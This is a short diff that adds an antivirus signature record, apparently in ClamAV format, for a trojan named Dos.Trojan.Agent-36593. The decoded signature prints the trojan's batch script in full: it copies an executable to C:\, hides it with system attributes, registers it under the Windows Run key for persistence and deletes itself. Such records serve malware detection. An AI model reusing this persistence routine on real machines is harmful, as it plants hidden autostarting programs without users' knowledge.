@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36593
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off color 0a copy stormliv.exe c:\stormliv.exe >nul attrib +r +s +h c:\stormliv.exe >nul copy stormliv.exe c:\stormliv.exe >nul @reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v dx /t reg_sz /d c:\stormliv.exe /f del %0 
